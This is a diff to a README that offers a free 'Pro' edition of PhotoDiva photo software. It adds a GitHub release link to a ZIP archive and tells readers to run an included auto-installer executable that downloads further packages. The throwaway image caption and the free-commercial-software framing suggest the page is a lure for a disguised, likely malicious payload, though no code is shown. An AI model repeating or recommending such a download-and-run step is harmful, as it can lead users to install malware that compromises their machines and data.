@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/794e50b6-1d15-4fce-9c65-31fc72f11885)
-]()
+](https://github.com/omerx01/PhotoDiva-Pro-free-2024/releases/download/V4.78/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/omerx01/PhotoDiva-Pro-free-2024/releases/download/V4.78/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-24_14-28-27](https://github.com/user-attachments/assets/5832e275-c887-42a7-b354-443453a9a478)
